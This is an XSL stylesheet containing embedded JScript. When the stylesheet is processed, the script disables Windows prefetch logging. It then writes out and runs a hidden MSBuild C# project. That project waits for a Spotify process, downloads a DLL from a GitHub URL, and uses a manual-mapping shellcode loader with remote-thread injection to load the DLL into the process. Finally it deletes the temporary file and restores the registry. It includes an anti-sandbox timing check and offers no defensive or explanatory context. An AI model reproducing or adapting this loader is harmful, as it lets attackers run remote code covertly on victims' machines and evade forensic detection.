<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts">
<msxsl:script language="JScript" implements-prefix="user">
function go(){
var sh=new ActiveXObject("WScript.Shell");
var fso=new ActiveXObject("Scripting.FileSystemObject");
try{sh.RegWrite("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher",0,"REG_DWORD");sh.RegWrite("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnableSuperfetch",0,"REG_DWORD");}catch(e){}
WScript.Sleep(2000);
var csproj='<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="Build"><FMM/></Target><UsingTask TaskName="FMM" TaskFactory="CodeTaskFactory" AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"><ParameterGroup/><Task><Reference Include="System.Core"/><Using Namespace="System"/><Using Namespace="System.Diagnostics"/><Using Namespace="System.Runtime.InteropServices"/><Using Namespace="System.Net"/><Using Namespace="System.Threading"/><Code Type="Class" Language="cs"><![CDATA[using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Net;using System.Threading;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class FMM:Task{[DllImport("kernel32.dll")]static extern IntPtr OpenProcess(uint a,bool b,int c);[DllImport("kernel32.dll")]static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport("kernel32.dll")]static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[]b,uint s,out int w);[DllImport("kernel32.dll")]static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint st,IntPtr fn,IntPtr p,uint f,out uint t);[DllImport("kernel32.dll")]static extern uint WaitForSingleObject(IntPtr h,uint m);[DllImport("kernel32.dll")]static extern bool CloseHandle(IntPtr h);[DllImport("kernel32.dll")]static extern bool VirtualFreeEx(IntPtr h,IntPtr a,uint s,uint t);[DllImport("kernel32.dll",CharSet=CharSet.Ansi)]static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32.dll",CharSet=CharSet.Unicode)]static extern IntPtr GetModuleHandle(string n);static byte[]SC(){return new byte[]{0x48,0x89,0x5C,0x24,0x08,0x48,0x89,0x6C,0x24,0x10,0x48,0x89,0x74,0x24,0x18,0x57,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0x83,0xEC,0x40,0x48,0x85,0xC9,0x0F,0x84,0x00,0x02,0x00,0x00,0x48,0x89,0xCF,0x4C,0x8B,0x67,0x18,0x4C,0x8B,0x2F,0x4C,0x8B,0x77,0x08,0x4C,0x8B,0x7F,0x10,0x66,0x41,0x81,0x3C,0x24,0x4D,0x5A,0x0F,0x85,0xDD,0x01,0x00,0x00,0x41,0x8B,0x44,0x24,0x3C,0x4C,0x01,0xE0,0x48,0x89,0xC3,0x81,0x3B,0x50,0x45,0x00,0x00,0x0F,0x85,0xC4,0x01,0x00,0x00,0x48,0x8D,0x6B,0x18,0x4C,0x89,0xE0,0x48,0x2B,0x45,0x18,0x48,0x89,0xC6,0x48,0x85,0xF6,0x74,0x60,0x8B,0x45,0x68,0x85,0xC0,0x0F,0x84,0x95,0x01,0x00,0x00,0x8B,0x45,0x60,0x4C,0x01,0xE0,0x48,0x89,0xC2,0x8B,0x02,0x85,0xC0,0x74,0x42,0x8B,0x4A,0x04,0x83,0xE9,0x08,0xC1,0xE9,0x01,0x48,0x8D,0x5A,0x08,0x85,0xC9,0x74,0x26,0x0F,0xB7,0x03,0x89,0xC7,0xC1,0xEF,0x0C,0x83,0xFF,0x0A,0x75,0x12,0x25,0xFF,0x0F,0x00,0x00,0x8B,0x3A,0x01,0xC7,0x4C,0x01,0xE7,0x48,0x01,0x37,0x48,0x83,0xC3,0x02,0x83,0xE9,0x01,0xEB,0xD5,0x03,0x52,0x04,0xEB,0xB8,0x8B,0x45,0x78,0x85,0xC0,0x74,0x60,0x8B,0x45,0x70,0x4C,0x01,0xE0,0x48,0x89,0xC2,0x8B,0x42,0x0C,0x85,0xC0,0x74,0x4E,0x4C,0x01,0xE0,0x48,0x89,0xC1,0x41,0xFF,0xD5,0x48,0x89,0xC3,0x48,0x85,0xDB,0x74,0x38,0x8B,0x02,0x85,0xC0,0x75,0x04,0x8B,0x42,0x10,0x4C,0x01,0xE0,0x48,0x89,0xC6,0x8B,0x42,0x10,0x4C,0x01,0xE0,0x48,0x89,0xC7,0x48,0x8B,0x06,0x48,0x85,0xC0,0x74,0x15,0x48,0x89,0xD9,0x48,0x8D,0x50,0x02,0x4C,0x01,0xE2,0x41,0xFF,0xD6,0x48,0x89,0x07,0x48,0x83,0xC6,0x08,0x48,0x83,0xC7,0x08,0xEB,0xDF,0x48,0x83,0xC2,0x14,0xEB,0xA6,0x8B,0x85,0x88,0x00,0x00,0x00,0x85,0xC0,0x74,0x30,0x8B,0x85,0x80,0x00,0x00,0x00,0x4C,0x01,0xE0,0x48,0x8B,0x40,0x18,0x48,0x85,0xC0,0x74,0x1C,0x48,0x8B,0x18,0x48,0x85,0xDB,0x74,0x12,0x4C,0x89,0xE1,0xBA,0x01,0x00,0x00,0x00,0x4D,0x31,0xC0,0xFF,0xD3,0x48,0x83,0xC0,0x08,0xEB,0xE5,0x8B,0x45,0x10,0x85,0xC0,0x74,0x10,0x4C,0x01,0xE0,0x4C,0x89,0xE1,0xBA,0x01,0x00,0x00,0x00,0x4D,0x31,0xC0,0xFF,0xD0,0x4C,0x89,0xE1,0xBA,0x00,0x10,0x00,0x00,0x41,0xFF,0xD7,0x48,0x83,0xC4,0x40,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x5F,0x48,0x8B,0x74,0x24,0x18,0x48,0x8B,0x6C,0x24,0x10,0x48,0x8B,0x5C,0x24,0x08,0xC3};}public override bool Execute(){try{int t=Environment.TickCount;Thread.Sleep(1000);if(Environment.TickCount-t<900)return true;int pid=0;for(int i=0;i<30;i++){foreach(var p in Process.GetProcessesByName("Spotify")){pid=p.Id;break;}if(pid!=0)break;Thread.Sleep(1000);}if(pid==0)return true;Thread.Sleep(500);ServicePointManager.SecurityProtocol=SecurityProtocolType.Tls12;byte[]dll=new WebClient().DownloadData("https://raw.githubusercontent.com/washedluca1-lgtm/UDLIKEDMA/main/UDLDMAXYTRUS.dll");if(dll==null||dll.Length<0x1000)return true;if(BitConverter.ToUInt16(dll,0)!=0x5A4D)return true;int elf=BitConverter.ToInt32(dll,0x3C);if(BitConverter.ToUInt32(dll,elf)!=0x4550)return true;int opt=elf+0x18;uint soi=BitConverter.ToUInt32(dll,opt+0x38);uint soh=BitConverter.ToUInt32(dll,opt+0x3C);ushort ns=BitConverter.ToUInt16(dll,elf+0x6);ushort so=BitConverter.ToUInt16(dll,elf+0x14);IntPtr hp=OpenProcess(0x1F0FFF,false,pid);if(hp==IntPtr.Zero)return true;IntPtr tb=VirtualAllocEx(hp,IntPtr.Zero,soi,0x3000,0x40);if(tb==IntPtr.Zero){CloseHandle(hp);return true;}int w;WriteProcessMemory(hp,tb,dll,soh,out w);int so2=elf+0x18+so;for(int i=0;i<ns;i++){int sec=so2+(i*0x28);uint va=BitConverter.ToUInt32(dll,sec+0x0C);uint rs=BitConverter.ToUInt32(dll,sec+0x10);uint rp=BitConverter.ToUInt32(dll,sec+0x14);if(rs>0&&rp>0&&rp+rs<=dll.Length){byte[]sd=new byte[rs];Buffer.BlockCopy(dll,(int)rp,sd,0,(int)rs);WriteProcessMemory(hp,(IntPtr)((long)tb+va),sd,rs,out w);}}byte[]md=new byte[32];IntPtr pLLA=GetProcAddress(GetModuleHandle("kernel32.dll"),"LoadLibraryA");IntPtr pGPA=GetProcAddress(GetModuleHandle("kernel32.dll"),"GetProcAddress");IntPtr pRZM=GetProcAddress(GetModuleHandle("ntdll.dll"),"RtlZeroMemory");Buffer.BlockCopy(BitConverter.GetBytes(pLLA.ToInt64()),0,md,0,8);Buffer.BlockCopy(BitConverter.GetBytes(pGPA.ToInt64()),0,md,8,8);Buffer.BlockCopy(BitConverter.GetBytes(pRZM.ToInt64()),0,md,16,8);Buffer.BlockCopy(BitConverter.GetBytes(tb.ToInt64()),0,md,24,8);IntPtr pm=VirtualAllocEx(hp,IntPtr.Zero,32,0x3000,0x04);if(pm==IntPtr.Zero){VirtualFreeEx(hp,tb,0,0x8000);CloseHandle(hp);return true;}WriteProcessMemory(hp,pm,md,32,out w);byte[]sc=SC();IntPtr ps=VirtualAllocEx(hp,IntPtr.Zero,(uint)sc.Length,0x3000,0x40);if(ps==IntPtr.Zero){VirtualFreeEx(hp,pm,0,0x8000);VirtualFreeEx(hp,tb,0,0x8000);CloseHandle(hp);return true;}WriteProcessMemory(hp,ps,sc,(uint)sc.Length,out w);uint tid;IntPtr ht=CreateRemoteThread(hp,IntPtr.Zero,0,ps,pm,0,out tid);if(ht!=IntPtr.Zero){WaitForSingleObject(ht,15000);CloseHandle(ht);}VirtualFreeEx(hp,ps,0,0x8000);VirtualFreeEx(hp,pm,0,0x8000);CloseHandle(hp);}catch{}return true;}}]]></Code></Task></UsingTask></Project>';
var tmp=sh.ExpandEnvironmentStrings("%TEMP%")+"\\x.csproj";
var f=fso.CreateTextFile(tmp,true);f.Write(csproj);f.Close();
sh.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe "+tmp+" /nologo /verbosity:quiet",0,true);
try{fso.DeleteFile(tmp);}catch(e){}
try{sh.RegWrite("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher",3,"REG_DWORD");sh.RegWrite("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnableSuperfetch",3,"REG_DWORD");}catch(e){}
return "";}
</msxsl:script>
<xsl:template match="/"><xsl:value-of select="user:go()"/></xsl:template>
</xsl:stylesheet>
